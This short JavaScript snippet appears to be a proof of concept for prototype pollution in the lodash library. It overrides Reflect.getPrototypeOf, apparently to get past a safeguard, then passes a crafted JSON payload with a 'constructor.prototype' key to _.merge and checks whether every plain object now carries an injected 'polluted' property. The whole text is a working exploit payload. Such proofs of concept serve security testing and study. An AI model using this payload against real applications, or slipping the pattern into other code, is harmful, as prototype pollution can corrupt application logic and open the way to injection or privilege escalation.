Reflect.getPrototypeOf = () => false;
const _ = require('lodash');
let payload = JSON.parse('{"constructor": {"prototype": {"polluted": "yes"}}}');
console.log({}.polluted);
_.merge({}, payload);
console.log({}.polluted);